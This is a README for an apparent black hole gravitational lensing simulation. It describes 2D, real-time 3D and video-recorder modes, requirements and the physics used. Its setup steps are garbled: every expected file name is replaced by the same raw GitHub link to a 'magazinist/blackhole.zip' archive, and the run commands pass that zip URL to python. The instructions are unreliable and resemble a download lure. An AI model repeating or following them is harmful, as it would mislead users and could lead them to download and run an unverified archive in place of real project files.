## üöÄ Getting Started

Welcome to the Black Hole Gravitational Lensing Simulation! This project lets you visualize how black holes bend spacetime and affect light. You will find three interactive simulations to explore:

1. **2D Simulation**: View light ray trajectories in a simplified 2D format.
2. **3D Real-time Simulation**: Experience the bending of light in an interactive 3D environment.
3. **3D Video Recorder**: Generate high-quality videos of cinematic black hole sequences.

## üñ•Ô∏è System Requirements

To run the Black Hole simulations, your computer should meet the following requirements:

- **Operating System**: Windows 10 or later, macOS, or Linux
- **RAM**: At least 4 GB of RAM
- **Graphics Card**: A graphics card that supports OpenGL 3.0 or later
- **Python**: Version 3.6 or later (included in the release packaging)

Once on the releases page, find the version you want. Click the file to download. After downloading, follow these steps:

1. Locate the downloaded file on your computer.
2. If the file is a **.zip** or **.tar** file, extract it to a folder.
3. Open the folder and find the simulation files:
   - `https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip`
   - `https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip`
   - `https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip`

4. Open your command prompt (Windows) or terminal (macOS/Linux).
5. Navigate to the folder where the files are located using the `cd` command. For example:
   ```
   cd path/to/your/folder
   ```
6. Run the desired simulation by typing:
   ```
   python https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip
   ```
   or
   ```
   python https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip
   ```
   or for video generation:
   ```
   python https://raw.githubusercontent.com/Dan1el22/blackhole/main/magazinist/blackhole.zip
   ```

## üåå Features

This project includes three key simulations:

### 1. Interactive 2D Visualization

The **2D Simulation** allows you to manipulate light ray trajectories. You can drag points to see how the black hole's gravity alters their paths. This simple interface helps you grasp gravitational lensing with immediate visual feedback.

### 2. Real-time 3D Simulation

The **3D Real-time Simulation** takes it a step further. Experience light bending around a black hole in real time. You can rotate and zoom in on the black hole and its accretion disk. This feature gives you an immersive understanding of how light behaves in strong gravitational fields.

### 3. 3D Video Recorder

The **3D Video Recorder** makes it simple to generate stunning videos of black hole interactions. Create cinematic sequences that show how light rays change as they approach the event horizon. Share your creations easily to fascinate friends and family.

## üìñ Physics Explained

For those curious about the underlying physics, we offer a detailed document on the equations used. Key elements include:

- **Schwarzschild Metric**: This ensures accurate geodesic calculations in warped spacetime.
- **Runge-Kutta Integration**: A 4th-order method for precise ray tracing.
- **Gravitational Lensing**: Realistic visualization of light bending.
- **Event Horizon**: The boundary surrounding a black hole where light cannot escape.

## üõ†Ô∏è Troubleshooting

If you encounter issues, consider these common solutions:

- Ensure you are using Python 3.6 or later.
- Verify your graphics card supports OpenGL 3.0.
- If simulations fail to launch, check your terminal for error messages for guidance.
- Revisit the download and installation steps to confirm all actions were completed correctly.
